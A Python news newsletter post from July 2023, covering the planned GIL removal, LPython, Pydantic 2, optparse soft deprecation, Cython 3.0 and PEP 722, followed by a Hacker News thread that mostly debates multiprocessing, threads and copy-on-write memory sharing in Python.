    "originBody": "Bite code! Subscribe Sign in What's up, Python? The GIL removed, a new compiler, optparse deprecated... July 2023 JUL 30, 2023 10 3 Share SummaryPython without the GIL, for goodLPython: a new Python CompilerPydantic 2 is getting usablePEP 387 defines \"Soft Deprecation\", getopt and optparse soft deprecatedCython 3.0 released with better pure Python supportPEP 722 – Dependency specification for single-file scriptsPython VSCode support gets fasterPaint in the terminalSubscribe Python without the GIL, for goodWe saw last month the Global Interpreter Lock was the center of attention once again. This month it carried on to the point than even Meta, Facebook’s parent company, pitched in:If PEP 703 is accepted, Meta can commit to support in the form of three [engineer years on landing] nogil CPythonIt is nice to have Python seeing more and more contributions from the big companies that used it for their success. It's a huge contrast compared to the 2010 decade.The discussion culminated with an internal debate with the core devs, which ended up with an official announcement that PEP 703, the proposal that relit the fire, was going to be accepted after some details being figured out.This means in the coming years, Python will have its GIL removed.Here is the plan:Short term, an unsupported experimental version of Python without the GIL is published in parallel to the regular one. Target is 3.13/3.14.Mid-term, the no-GIL version is marked as officially supported, but is still just an alternative to Python with GIL. A target date is announced to make it the default once. This will happen only after the community has shown enough support for it, and will take several years.Long-term, no-GIL becomes the default. Before this, the core devs can reverse the decision and abort the no-GIL project if it proves to have a bad ROI.Note that if the program imports one single C-extension that uses the GIL on the no-GIL build, it's designed to switch back to the GIL automatically. So this is not a 2=>3 situation where non-compatible code breaks.The main reason for the two different builds is to manage the unknown unknowns. Indeed, nobody expects the no-GIL to break things, but with such a big project, you can never be sure. ABI compat is tricky, and new extensions need to be compiled explicitly against it for it to work, so there is a need for the community embracing it.Also, no-GIL compatible extensions will work on the old interpreter, so you don't get in the situation like Python 3 code not working on Python 2.In fact, Python code itself should not be affected and will work seamlessly on one or the other, albeit with threads limited to a single core with the GIL.LPython: a new Python CompilerThat's the news I didn't see coming. In \"What's the deal with CPython, Pypy, MicroPython, Jython...?\" we talked about Python compilers, and I thought I did a pretty good job about listing everything that mattered. Well, the team behind LPython decided to take this list and .append() on it.LPython is a new BSD 3 compiler that takes Python code and translate it for the following for LLVM, C, C++ or WASM. It doesn't aim to compile the entire program, although it can, but rather, like numba and cython, to let you speed up numerical bottle neck. The benchmarks are very promising and the ability to switch between Ahead-of-Time and Just-in-Time very convenient, although you will still need the entire compilation chain installed on the machine. LPython likes raw Python code, so if you call a Python function inside your snippet, you must explicitly mark it as such with a decorator. So most will likely use it for very specific snippets.Pydantic 2 is getting usableI've been pitching the coming of the version 2 of Pydantic for some time, because I, and many people, use it a lot for data validation / schema definition, and the new version is much faster.Yes, it came out as stable last month, but if you read \"Relieving your Python packaging pain\" you know I don't encourage people to use the last version of anything except for testing or having fun.Indeed, even a stable major version is still something that is guaranteed to need refinement, and still has little community support.But now two things have happened:Pydantic 2.1 has been released, the first wave of nasty bugs have been eradicated.Fast API announced support of Pydantic 2. Since it's the biggest driver of Pydantic usage, it's a milestone.I will now proceed with giving it a try in one personal project, and if it works, move it into professional projects in a few months.PEP 387 defines \"Soft Deprecation\", getopt and optparse soft deprecatedIf you haven't read Victor Stinner's blog yet, I encourage you to do so. It's technical and raw, with zero BS, and gives you a good view of what happens inside the contribution life of a core dev. Last article mentions something I missed last month: soft deprecation has been added to PEP 387 – Backwards Compatibility Policy.This document, created in 2009, states how the Python projects deals with deprecation, and it will now contain the following:A soft deprecation can be used when using an API which should no longer be used to write new code, but it remains safe to continue using it in existing code. The API remains documented and tested, but will not be developed further (no enhancement). The main difference between a “soft” and a (regular) “hard” deprecation is that the soft deprecation does not imply scheduling the removal of the deprecated API.Basically, a soft deprecated API is in a zombie state, maintained alive forever, but will never see any work on it and be explicitly advised against being used.optparse and getopt, two modules that used to be a de-facto solution for parsing script arguments in their time, are now marked as \"soft-deprecated\". You can use them forever, but you probably should not.First, argparse is the more modern stdlib solution, and we have a good article on it.Second, 3rd party projects like typer and click exist.Cython 3.0 released with better pure Python supportCython, the most famous Python compiler, released version 3. While the release comes with all sorts of improvement, one particularly stands out. Cython always had limitations: it used a superset of Python to express some of its features.This is no more the case, as the release notes: \"it should now be possible to express all Cython code and use all features in regular Python syntax\".Which means you now should be able to use any Python code base, just Cython it all and see what happens.PEP 722 – Dependency specification for single-file scriptsWhile the no-GIL topic was certainly still alive and well, the proposal of PEP 722 really heated things up.The idea is to formalize a syntax in comments that, similar to Groovy’s, would allow expressing the dependency of a single script. Taking the example from the PEP itself:# In order to run, this script needs the following 3rd party libraries # # Requirements: #requests #richimport requests from rich.pretty import pprintresp = requests.get(\"https://peps.python.org/api/peps.json\") data = resp.json() pprint([(k, v[\"title\"]) for k, v in data.items()][:10])The important lines are:# Requirements: #requests #richWhich now would be officially formalized to be parsed by third-party tools. The concept is not new and tools like pip-run already support running a script for which you have the deps described with such comments:$ pip uninstall rich requests WARNING: Skipping rich as it is not installed. WARNING: Skipping requests as it is not installed. $ pip-run dah_script.py [ │ ('1', 'PEP Purpose and Guidelines'), │ ('2', 'Procedure for Adding New Modules'), │ ('3', 'Guidelines for Handling Bug Reports'), │ ('4', 'Deprecation of Standard Modules'), │ ('5', 'Guidelines for Language Evolution'), │ ('6', 'Bug Fix Releases'), │ ('7', 'Style Guide for C Code'), │ ('8', 'Style Guide for Python Code'), │ ('9', 'Sample Plaintext PEP Template'), │ ('10', 'Voting Guidelines') ]Packages are installed in a temporary virtual env and deleted after the run, like npx used to do for the JS world.The PEP doesn't imply Python or pip are going to integrate such feature, it's only about formalizing the syntax for now. But I have good hope for this one, as I have several lone Python scripts lying around that would really benefit from this, especially if you can keep the env around in the future. Such a proposal could show demand for it, and years later, lead to pip adoption. E.G: npx influenced the addition of npm create, which allows to fetch a project template from specific packages. Indeed, that was the most common use case for npx.Python VSCode support gets fasterIf you use VSCode, you may have noticed using a lot of linters made the IDE slower. Mypy is particularly at fault as the mypy command is slow to start, and the daemon mode is not used by VSCode.For his new release, a new official mypy extension is now available, which uses the dmypy daemon. The speed up is such that the editor can now offer the check on the entire code base, not just the current file.On top of that, pylance, the Microsft official extension for Python support, will now persist all the indexing work it performs on 3rd party libs. This will result in a lighter startup, and for big project, a speedier experience as indexing can take some time with slow machines.I personally have to work on corporate clients’ laptops I can't modify, and they come with a ton of security software that makes them slow down to crawl, with process inspection and network calls to check file signatures after you click on anything. So this is a lifesaver.Paint in the terminalThis is just so cool:It's a version of paint that runs in the terminal, thanks to the Python lib textualIt's not going to change your life or anything, but WOW.I installed it, and it's damn reactive. It even handles Ctrl-Z, and features a file selector when you try to save your work.Wanna receive the next “What’s Python” article in August? Subscribe!Subscribe 10 Likes · 1 Restack 10 3 Share Previous 3 Comments Dude 3 hr agoConcerning `textual-paint`... \"It even handles Ctrl-Z\"That actually isn't a good idea for any program running in a terminal.LIKE REPLY 1 reply by Bite Code! Daylin 16 hr ago Liked by Bite Code!\"As I have several lone Python scripts lying around that would really benefit from this, especially if you can keep the env around in the future.\"This is possible with github.com/daylinmorgan/viv. Can be used similar to pip-run. But additionally can be used via curl or as a standalone function in your seldom one-off scripts.LIKE (1) REPLY 1 more comment… Top New Community XML is the future Okay, campers, rise and shine... JUN 24 99 19 This is valid Python syntax Sometimes it's even useful too JUN 10 9 2 Why not tell people to \"simply\" use pyenv, poetry or anaconda You keep using that word. I don’t think it means what you think it means. MAR 30 23 25 See allReady for more?Subscribe © 2023 Bite Code! Privacy ∙ Terms ∙ Collection notice Start Writing Get the app Substack is the home for great writing",
    "commentLink": "https://news.ycombinator.com/item?id=36935041",
    "commentBody": "What's up, Python? The GIL removed, a new compiler, optparse deprecated (bitecode.dev)369 points by BiteCode_dev 19  258 commentsdang 6 hours ago | next [–] Recent and related:Intent to approve PEP 703: making the GIL optional - https://news.ycombinator.com/item?id=36913328 - July 2023 (488 comments)wmwmwm 17 hours ago | prev | next [–] Historically I’ve written several services that load up some big datastructure (10s or 100s of GB), then expose an HTTP API on top of it. Every time I’ve done a quick implementation in Python of a service that then became popular (within a firm, so 100s or 1000s of clients) I’ve often ended up having to rewrite in Java so I can throw more threads at servicing the requests (often CPU heavy). I may have missed something but I couldn’t figure out how to get the multi-threaded performance out of Python but of course no-GIL looks interesting for this!replyiknownothow 8 hours ago | parent | next [–] I would consider the following optimizations first before attempting to rewrite an HTTP API since you already did the hard part:1. For multiples processes use `gunicorn` [1]. Runs your app across multiple processes without you having to touch your code much. It's the same as having the n instances of the same backend app where n being the number of CPU cores you're willing to throw at it. One backend process per core, full isolation.2. For multiple threads use `gunicorn` + `gevent` workers [2]. Provides multiprocessing + multithreaded functionality out of the box if you have IO intensive. It's not perfect but works very well in some situations.3. Lastly, if CPU is where you have a bottleneck, that means you have some memory to spare (even if it's not much). Throw some LRU cache or cachetools [3] over functions that return the same result or functions that do expensive I/O.[1]: https://www.joelsleppy.com/blog/gunicorn-sync-workers/[2]: https://www.joelsleppy.com/blog/gunicorn-async-workers-with-...[3]: https://pypi.org/project/cachetools/replydanpalmer 2 hours ago | root | parent | next [–] These don't really apply to the parent commenter's scenario.1) gunicorn or any solution with multiple processes is going to just multiply the RAM usage. Using 10-100GB of RAM per effective thread makes this sort of problem very RAM bound, to the point that it can be hard to find hardware or VM support.2) This isn't I/O bound.3) If your service is fundamentally just looking up data in a huge in-memory data store, adding LRU caching around that is unlikely to make much of a difference because you're a) still doing a lookup in memory, just for the cache rather than the real data, and b) you're still subject to the GIL for those cache lookups.I've also written services like this, we only loaded ~5GB of data, but it was sufficient to be difficult to manage in a few ways like this. The GIL-ectomy will probably have a significant impact on these sorts of use cases.replykayodelycaon 1 hour ago | root | parent | next [–] For #1, would copy on write help? Or does python store the counters on the objects?replyxmaayy 3 hours ago | root | parent | prev | next [–] > 1. For multiples processes use `gunicorn`This will load up multiple processes like you say. OP loads a large dataset and gUnicorn would copy that dataset in each process. I have never figured out shared memory with gUnicorn.replyzbentley 2 hours ago | root | parent | next [–] > gUnicorn would copy that dataset in each processAssuming you're on Linux/BSD/MacOS, sharing read-only memory is easy with Gunicorn (as opposed to actual POSIX shared memory, for which there are multiprocessing wrappers, but they're much harder to use).To share memory in copy-on-write mode, add a call to load your dataset into something global (i.e. a global or class variable or an lru_cache of a free/class/static method) in gunicorn's \"when_ready\" config function[1].This will load your dataset once on server start, before any processes are forked. After processes are forked, they'll gain access to that dataset in copy-on-write mode (this behavior is not specific to python/gunicorn; rather, it's a core behavior of fork(2)). If those processes do need to mutate the dataset, they'll only mutate their copy-on-write copies of it, so their mutations won't be visible to other parallel Gunicorn workers. In other words, if one request in a parallel=2 gunicorn mutates the dataset, a subsequent request has only a 50% likelihood of observing that mutation.If you do need mutable shared memory, you could either check out databases/caches as other commenters have mentioned (Redislite[2] is a good way to embed Redis as a per-application cache into Python without having to run or configure a separate server at all; you can launch it in gunicorn's \"when_ready\" as well), or try true shared memory[3][4]1. https://docs.gunicorn.org/en/stable/settings.html#when-ready 2. https://pypi.org/project/redislite/ 3. https://docs.python.org/3/library/multiprocessing.html#share... 4. https://docs.python.org/3/library/multiprocessing.shared_mem...replysanderjd 2 hours ago | root | parent | prev | next [–] One way to achieve similar performance is redis or memcached running on the same node. It really depends on the workload too. If it is lookups by key without much post-processing, that architecture will probably work well. If it's a lot of scanning, or a lot of post-processing, in-process caching might be the way to go, maybe with some kind of request affinity so that the cache isn't duplicated across each process.replynwallin 15 hours ago | parent | prev | next [–] > I may have missed something but I couldn’t figure out how to get the multi-threaded performance out of PythonMultiprocessing. The answer is to use the python multiprocessing module, or to spin up multiple processes behind wsgi or whatever.> Historically I’ve written several services that load up some big datastructure (10s or 100s of GB), then expose an HTTP API on top of it.Use the python multiprocessing module. If you've already written it with the multithreading module, it is a drop in replacement. Your data structure will live in shared memory and can be accessed by all processes concurrently without incurring the wrath of the GIL.Obviously this does not fix the issue of Python just being super slow in general. It just lets you max out all your CPU cores instead of having just one core at 100% all the time.replymort96 6 hours ago | root | parent | next [–] I want to warn people against multiprocessing in python though.If you're thinking about parallelizing your Python process, chances are your Python code is CPU-bound. That's when you should stop and think, is Python really the right tool for this job?From experience, translating a Python program into C++ or Rust often gives a speed-up of around 100x, without introducing threads. Go probably has a similar level of speed-up. So while you can throw a lot of time fighting Python to get it to consume 16x the compute resources for a 10x speed-up, you could often instead spend a similar amount of time rewriting the program for a 100x speed-up with the same compute resources. And then you could parallelize your Go/Rust/C++ program for another 10x, if necessary.Of course, this is highly dependent on what you're actually doing. Maybe your Python code isn't the bottleneck, maybe your code spends 99% of its time in datastructure operations implemented in C and you need to parallelize it. Or maybe your use-case is one where you could use pypy and get the required speed-up. I just recognize from my own experience the temptation of parallelizing some Python code because it's slow, only to find that the parallelized version isn't that much faster (my computer is just hotter and louder), and then giving in and rewriting the code in C++.replyaragilar 3 hours ago | root | parent | next [–] The first thing you should do is profile the code (py-spy is my preferred option) and see if there are any obvious hotspots. Then I'd actually look at the code, and understand what the structure is. For example, are you making lots of unnecessary copies of data? Are you recomputing something expensive you can store (functools.cache is one line and can make things much faster at the cost of memory)?Once you've done that, then you should be familiar enough the code to know which bits are worth using multiprocessing on (i.e. the large embarrassingly parallel bits), which if they are a significant part of your code should scale near linearly.The other thing to check is which libraries are you using (and what are your dependencies using). numpy now includes openblas (though mkl may be faster for your usecase), but sometimes you can achieve large speedups though choosing a different library, or ensuring speedups are being built.replysanderjd 2 hours ago | root | parent | next [–] Is there a better resource than the py-spy docs for figuring out how to use it?replyRayVR 14 hours ago | root | parent | prev | next [–] Multiprocessing is not a real solution, it’s a break-glass procedure when you just need to throw some cores at something without any hope for reliability. Unless something has changed since I used python, it is essentially a wrapper on Fork.This means you need to deal with stuck/dead processes. I’ve used multiprocessing extensively and once you hit a certain amount of usage, even in a pool, you just get hangs and unresponsive processes.I’ve also written a huge amount of Cython wrapped c++ code which releases the GIL. This never hangs and I can multithread there all I want without issue.replyemmelaich 13 hours ago | root | parent | next [–] Why would they get stuck/dead and why wouldn't that happen with threads which might be even worse as they're more tightly bound? At least with zombies or inactive processes you can detect and kill them externally - if needs be.Haven't played with multiprocess at scale, so am genuinely interested.replyoivey 12 hours ago | root | parent | next [–] If subprocesses die (segfault maybe) it isn't uncommon for them to not be cleaned up and/or cause the parent process to hang while it waits for the zombie to respond. That's one I experienced last week on Python 3.9. A thread that experienced that would likely kill the parent process or maybe even exit with a stacktrace. Way easier to debug, and doesn't require me to search through running tasks and manually kill them after each debug cycle.My impression is that the multiprocessing module is a heroic effort, but unfortunately making the whole system work transparently across multiple OSs and architectures is a nearly insurmountable problem.replyempthought 12 hours ago | root | parent | next [–] You may be interested in the concurrent.futures library, available for over a decade now. It keeps you from shooting yourself in the foot like that.https://docs.python.org/3/library/concurrent.futures.htmlreplyKolenCh 10 hours ago | root | parent | next [–] Why do you think it would help?It provides a nice interface but is using multiprocessing or multi threading under the hood depending on which executioner you use:> The ProcessPoolExecutor class is an Executor subclass that uses a pool of processes to execute calls asynchronously. ProcessPoolExecutor uses the multiprocessing module, which allows it to side-step the Global Interpreter Lock but also means that only picklable objects can be executed and returned.replyempthought 10 hours ago | root | parent | next [–] Your trouble seems to involve not understanding how to set up signal handlers, which ProcessPoolExecutor handles for you and exposes via a BrokenProcessPool exception.replywiseowise 7 hours ago | root | parent | next [–] > Derived from BrokenExecutor (formerly RuntimeError), this exception class is raised when one of the workers of a ProcessPoolExecutor has terminated in a non-clean fashion (for example, if it was killed from the outside).What if it hangs?replyempthought 4 hours ago | root | parent | next [–] That isn’t the scenario originally described, but there is a timeout parameter in future.result().replynine_k 10 hours ago | root | parent | prev | next [–] Always setting a timeout on every IPC or network operation helps immensely. IIRC multiprocessing module allows that everywhere, but defaults to waiting forever in a couple of places.replyjjoonathan 14 hours ago | root | parent | prev | next [–] Yep, multiprocessing is a cope.If processes were a universal substitute for threads we wouldn't have threads. That reasoning only gets stronger when you apply python's heavy limitations, but it gets the most strength when you experience the awkwardness of multiprocessing firsthand.replyakvadrako 3 hours ago | root | parent | next [–] There isn't much difference on Linux between threads and processes that share memory. Multiprocessing is fine, it's just slightly more isolated threads.replyjjoonathan 1 hour ago | root | parent | next [–] That's why I took special care to mention how python's multiprocessing module was particularly poor.replydurumu 1 hour ago | root | parent | prev | next [–] There is a \"fork\" mode and a \"spawn\" mode. Fork (the default) tends to result in broken process pools as you say, spawn seems to work a lot better but the performance is worse.replyslt2021 14 hours ago | root | parent | prev | next [–] multiprocessing is very good solution for scatter-and-gather (or map/reduce) type workloads: for example ssh to 1000 machines, run some commands, grab output, analyze output, done some action based on output, etcif you are managing a fleet of machines and have some tasks to do on each machine, then multiprocessing is the life saver.replytoasted-subs 14 hours ago | root | parent | prev | next [–] I’m not a huge fan of Cython and the like. It seems to be more natural to open a tcp connection to a c/c++ program and let that do the heavy lifting. Anything else seems like not a proper UNIX style solution.replyKolenCh 10 hours ago | root | parent | next [–] That's not natural at all. Eg pybind11 is more natural.replyalfalfasprout 13 hours ago | root | parent | prev | next [–] Nowadays multiprocessing is rarely the answer. Between all the gotchas (memory usage can be horrific, have to be careful what you modify, etc.) it's almost never the right answer.Nowadays numba is usually a better solution for when you want to run some computationally expensive python code that itself calls numpy, etc.For the parent commenter's use case though that wouldn't be a great solution either. In general, Python does not have an optimal way of operating on a shared data structure across OS threads and certainly not in a way that doesn't require forking the interpreter.replychlorion 12 hours ago | root | parent | next [–] You have to be much more careful about what you modify when using multithreading, so I'm not sure what you mean by that.A lot of people here mention that sharing data is much easier with multithreading, but doing this without races is not easy.You can't just use the values from difference threads like you would in normal code, you need to synchronize access with locks, which can be difficult to do correctly and can harm performance in a lot of cases.I think a lot of the people who complain about the GIL are going to become acutely aware of why it was useful when they attempt to use GIL-less multithreading, and realize that removing it wasn't as great as it sounded at first!In my experience, most problems are inherently synchronous with lots of mutable state and complex data dependencies, or inherently parallel with lots of tasks that can run independently. Problems that can be easily parallelized already work fine with multiprocessing! Problems that can't be easily parallelized are not something you can just slap some threading on to get more performance, and will require a lot of work to keep state synced!This is just my opinion though and I'm sure there are plenty of domains that I don't have experience with that will benefit from no-GIL python!replythrashh 12 hours ago | root | parent | next [–] Multithreading is hard but once you have been doing it a while, it becomes easy and most importantly, it’s stable.When you have to deal with processes, there’s a lot of external factors out of your control because processes are much more visible and carry a lot of extra baggage.Hard multithreading problems are fun. Hard multi-process problems are just tedious.replyda39a3ee 1 hour ago | root | parent | next [–] As I understand it on Linux processes and threads are implemented in almost the same way, just that threads share memory. I've heard it said several times that the idea that processes are \"heavier\" is a bit of a myth. I guess they need to allocate heap space and threads don't. I'm not an expert, just mentioning because it sounded like you might be believing something which is at odds with what people say about processes and threads on Linux.replymvncleaninst 6 hours ago | root | parent | prev | next [–] > Problems that can be easily parallelized already work fine with multiprocessing!Yeah, except afaik you pay more in context switches, sharing is more cumbersome. Also language runtime of a single process is likely working with less information, you end up using more memory on multiple language runtime instancesFrankly I'd just use Java or Go at that point and not even botherreplycoldtea 14 hours ago | root | parent | prev | next [–] >Use the python multiprocessing module. If you've already written it with the multithreading module, it is a drop in replacement. Your data structure will live in shared memoryOnly if it can be immutable. So it can't be shared and changed by multiple processes as needed (with synchronization).And even if you can have it mostly immutable, if you need to refresh it (e.g. after some time read a newer large file from disk to load into your data structure), you can't without restarting the whole server and processes.So, it could work for this case, but it's hardly a general solution for the problem.replyfelipetrz 8 hours ago | root | parent | next [–] For this use case it would be better to put the data in a shared SQLite database than relying on multiprocessing CoW.Even accessing objects from the shared memory would cause the reference counter to increment and the data would be copied, causing a memory usage explosion.replycoldtea 6 hours ago | root | parent | next [–] >For this use case it would be better to put the data in a shared SQLite database than relying on multiprocessing CoWIn Python yes. In Java you could take advantage of shared memory and get spared the overhead of SQLite.replythe8472 5 hours ago | root | parent | prev | next [–] Loading 100GB into RAM and then calling fork() is just painting a giant OOM Killer target on your back. It'll work until something breaks the CoWs or the parent gets restarted while some forks still linger or other fun things like that.Threads make it transparent to the OS that this memory really must be shared between compute tasks.replyzbentley 1 hour ago | root | parent | next [–] While that does sometimes happen, I find the risk to be overstated. Most simple \"allocate a large, complex data structure (e.g. dict of vectors of dataclasses) before creating a multiprocessing.Pool/Process/concurrent.futures.ProcessPoolExecutor and then refer to parts of it in the executor's jobs\" work that deals in GBs of data does not suffer from copy-on-write-induced OOM issues in my experience. If the data in the shared memory isn't mutated in python, the refcount mutations are rarely enough to dirty more than a fraction of a percent of pages (though there are pathological allocation/reference schemes where that's not true).If you do have memory issues, calling 'gc.freeze()' right before creating your multiprocessing.Pool/Process/concurrent.futures.ProcessPoolExecutor is sufficient to mitigate refcount-related page dirtying in the vast majority of cases. In the small remaining minority of cases, 'gc.disable()' as suggested by the freeze docs[1] may help. If that still doesn't do it, or if your page-dirtying is due to actual mutations of data (not just refcounts), it may be time to reach for actual shared memory instead[2][3].1. https://docs.python.org/3/library/gc.html#gc.freeze 2. https://docs.python.org/3/library/multiprocessing.html#share... 3. https://docs.python.org/3/library/multiprocessing.shared_mem...replydekhn 15 hours ago | root | parent | prev | next [–] Over quite some time I've become convinced multiprocessing module is better than an optional GIL removal.It may leave many useful bits on the table (compared to pure multithreaded coding, like C++/pthreads) but I've still been able to get it to scale my application performance (CPU-bound, large-memory) to the number of cores of even large boxes (96+ vCPUs). IIRC the future/concurrent library was key to being productive.20 years ago I would said different, as at the time, IronPython demonstrated a real alternative to CPython that was faster, and fully multitrhreaded (including the container classes).replyapelapan 6 hours ago | root | parent | next [–] Sure, with multiprocessing you can get 96 python processes running at 100% CPU while sharing a large dataset.Only problem is that 99% of that CPU usage is for serializing/deserializing IPC messages and total throughput would have been higher using a single process.There are use-cases for multiprocessing. As long as data sharing between processes is insignificant, it can be quite performant. Just like using a bash-wrapper script that orchestrates a bunch of python (or other) processes.replyOkGoDoIt 11 hours ago | root | parent | prev | next [–] Whatever happened to ironpython? I used to do a lot of C# development and remember dabbling with ironpython back in the day. It seemed like it was important to Microsoft, .Net added the whole concept of dynamic data types mostly to support ironpython and ironruby. But I never really used python much until recently, so of course when I finally needed to do python I looked for ironpython and it doesn’t appear to be a thing anymore.replythrowaway2037 9 hours ago | root | parent | next [–] It looks like Microsoft abandoned these dynamic language implementations in 2010. Maintaining parallel implementations of two complex, mature scripting languages is a huge feat. It would take some very expensive talent. That said, IronPython was loved by those who used it, which means it captured them in the DotNet ecosystem. Perhaps that win was not enough for Microsoft to continue the project. Ideally, Python foundation should \"own\" (and fund) Jython and IronPython development, but that takes (a lot of) money. (Sorry, I'm much less familiar with Ruby and IronRuby.)replyTurskarama 10 hours ago | root | parent | prev | next [–] It is still a thing, but it's open source now instead of maintained by Microsoft. There was a release that finally supports Python 3 in December last year.I don't know how useful it is really, if you really want performance then you probably shouldn't choose Python to begin with, or you use the libraries which may not be compatible with IronPython. These days it barely takes me longer to build a simple script in C# than in Python either.replyHdS84 9 hours ago | root | parent | next [–] It's so so. Pythons core value is it's huge stack of lib's. And most important fall down with IP due to them using c and so on.When we needed python c# interop it was better to use python.net and integrate that way. Annoying to setup but when it works you can get both to work seamlesslyreplyamrx101 9 hours ago | root | parent | prev | next [–] I dont really partake in programming \"wars\", but the idea of launching a set of separate processes instead of separate threads to do a bunch of IOs has always seem to be weird to me. Yes, I have built software using Python. Yes, I have done things as you suggest. Now I use asyncio, since the syntax has matured and I finally understand coroutines, runners, tasks etc. Lets see where the GIL less Python takes us.replyda39a3ee 1 hour ago | root | parent | next [–] I'm confused. If you're doing a \"bunch of IOs\" then that's the situation where people use threads in Python, not processes. The argument for processes in Python is CPU-bound workloads.replyscrozart 12 hours ago | root | parent | prev | next [–] Yup. I work at the Space Telescope Science Institute, where we maintain pipelines for astronomical data that move petabytes, among other things. All of the heavy lifting is done in Python.replygodelski 15 hours ago | root | parent | prev | next [–] This exists, but one of two things happen, which still significantly slows things down. Either 1) you generate multiple python instances or 2) you push the code to a different language. Both are cumbersome and have significant effects. The latter is more common in computational libraries like numpy or pytorch, but in this respect it is more akin to python being a wrapper for C/C++/Cuda. Your performance is directly related to the percentage of time your code spends within those computation blocks otherwise you get hammered by IO operations.replynine_k 10 hours ago | root | parent | prev | next [–] Multiprocessing is great. But then every process keeps its own copy of hundreds of gigabytes of stuff. May be okay, depending on how many processes you spawn.If the bulk of the data is immutable (or at least never mutated), it can be safely shared though, via shared memory.replyzbentley 1 hour ago | root | parent | next [–] > every process keeps its own copy of hundreds of gigabytes of stuff. May be okay, depending on how many processes you spawnThat depends on how you're using multiprocessing. If you're using the \"spawn\" multiprocessing-start method (which was set to the default on MacOS a few years ago[1], unfortunately), then every process re-starts python from the beginning of your program and does indeed have its own copy of anything not explicitly shared.However, the \"fork\" and \"forkserver\" start methods make everything available in python before your multiprocessing.Pool/Process/concurrent.futures.ProcessPoolExecutor was created accessible for \"free\" (really: via fork(2)'s copy-on-write semantics) in the child processes without any added memory overhead. \"fork\" is the default startup mode on everything other than MacOS/Windows[2].I find that those differing defaults are responsible for a lot of FUD around memory management regarding multiprocessing (some of which can be found in these comments!); folks who are watching memory while using multiprocessing on MacOS or Windows observe massively different memory consumption behavior than folks on Linux/BSD (which includes folks validating in Docker on MacOS/Windows). There's an additional source of FUD among folks who used Python on MacOS before the default was changed from \"fork\" to \"spawn\" and who assume the prior behavior still exists when it does not.This sometimes results in the humorously counterintuitive situation of someone testing some Python code in Docker on MacOS/Windows observing far better performance inside Docker (and its accompanying virtual machine) than they observe when running that same code natively directly on the host operating system.If you're on MacOS (not Windows) and wish to use the \"fork\" or \"forkserver\" behaviors of multiprocessing for memory sharing, do \"export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES\" in your shell before starting Python (modifying os.environ or calling os.setenv() in Python will not work), and then call \"multiprocessing.set_start_method(\"fork\", force=True)\" in your entry point. Per the linked GitHub issue below, this can occasionally cause issues, but in my experience it does so rarely if ever.1. https://github.com/python/cpython/issues/779062. https://docs.python.org/3/library/multiprocessing.html#conte...replyda39a3ee 1 hour ago | root | parent | next [–] Is what you're describing only true of the \"Framework\" Python build on MacOS? It sounds like that's the case from a quick read of the issue you linked. I would say that people should basically never use the \"Framework\" Python on MacOS. (There's some insanity IIRC where matplotlib wants you to use the Framework build? But that's matplotlib)replyzbentley 1 hour ago | root | parent | next [–] > Is what you're describing only true of the \"Framework\" Python build on MacOS?No. This behavior is present on any Python 3.8 or greater running on MacOS, enforced via \"platform == darwin\" runtime check: https://github.com/python/cpython/pull/13626/files#diff-6836...You can check the default process-start method of your Python's multiprocessing by running this command: \"python -c 'import multiprocessing; print(multiprocessing.get_start_method())'\"replyoivey 15 hours ago | root | parent | prev | next [–] You have to manually set up shared memory with its own API that has its own limitations, right? I thought some seamless integration was a new feature, but AFAICT, transfers between multiprocesses still leads to things being pickled and copied. Am I wrong?replyzbentley 1 hour ago | root | parent | next [–] > Am I wrong?Only partially. When you send things to a multiprocessing.Pool/concurrent.futures.ProcessPoolExecutor, they're pickled and copied. \"Sending\" happens when passing arguments to e.g. \"multiprocessing.Pool.apply_async()\", \"multiprocessing.Queue.put()\" or \"concurrent.futures.ProcessPoolExecutor.submit()\".However, there are two other ways to share data into your multiprocessing processes:1. Copy-on-write via fork(2). In this mode, globally-visible data structures in Python that were created before your Pool/ProcessPoolExecutor are made accessible to code in child processes for (nearly) free, with no pickling, and no copying unless they are mutated in the child process. Two caveats here, which I've discussed in other comments on this thread: mutation may occur via garbage collection even if you don't explicitly change fork-shared data in Python[1]; and fork(2) is not used by default in multiprocessing on MacOS or Windows[2].2. Using explicit shared memory data structures provided by Multiprocessing[3][4]. These do not incur the overhead (in CPU or copied memory) that pickle-based IPC does, but they are not without complexity or cost.Unfortunately, truly \"seamless integration\" is not really possible with multiprocessing, so users will have to use one or more of the above strategies according to their application needs.1. https://news.ycombinator.com/item?id=36940118 2. https://news.ycombinator.com/item?id=36941791 3. https://docs.python.org/3/library/multiprocessing.html#share... 4. https://docs.python.org/3/library/multiprocessing.shared_mem...replywhywhywhydude 14 hours ago | root | parent | prev | next [–] If you have a non trivial application, multiprocessing just takes a lot of memory. Every child process that you create duplicates the parent memory. There are some interesting hacks like gc.freeze that exploits the copy on write feature of forks to reduce memory, but ultimately you can just create a few hundred of processes compared to thousands of threads because of memory consumption.replycoldtea 14 hours ago | root | parent | next [–] >If you have a non trivial application, multiprocessing just takes a lot of memory. Every child process that you create duplicates the parent memory.Not really, unless you want to alter it. The OS uses copy on write behind the scenes for forked processes, so will use the same memory locations already loaded until/if you modify that. So parent memory isn't really duplicated.As for any new memory allocated by each child process, that's its own.replywhywhywhydude 13 hours ago | root | parent | next [–] Unfortunately, python garbage collector messes up copy on write. Here’s a blog from instagram on how they fixed it - https://instagram-engineering.com/copy-on-write-friendly-pyt...replysgeisenh 14 hours ago | root | parent | prev | next [–] Unfortunately the generational GC modifies bits all over the heap, so you have to use some tricks to really leverage copy on write (as the commenter alludes to).replyzbentley 1 hour ago | root | parent | prev | next [–] The situation is a bit more complicated than this. While it's usually not the case that child processes always duplicate parent memory, that does happen on certain platforms (MacOS and Windows) on some Pythons. Additionally, the situation regarding unexpected page dirtying of copy-on-write memory is nuanced as well, which some of the sibling comments allude to.I'll copy the tl;dr from another comment I've made nearby:There are three main ways to share data into your multiprocessing processes:1. By sending that data to them with IPC/pickling/copying, e.g. via \"multiprocessing.Pool.apply_async()\", \"multiprocessing.Queue.put()\" or \"concurrent.futures.ProcessPoolExecutor.submit()\".2. Copy-on-write via fork(2). In this mode, globally-visible data structures in Python that were created before your Pool/ProcessPoolExecutor are made accessible to code in child processes for (nearly) free, with no pickling, and no copying unless they are mutated in the child process. Two caveats here, which I've discussed in other comments on this thread: mutation may occur via garbage collection even if you don't explicitly change fork-shared data in Python[1]; and fork(2) is not used by default in multiprocessing on MacOS or Windows[2].3. Using explicit shared memory data structures provided by Multiprocessing[3][4].1. https://news.ycombinator.com/item?id=36940118 2. https://news.ycombinator.com/item?id=36941791 3. 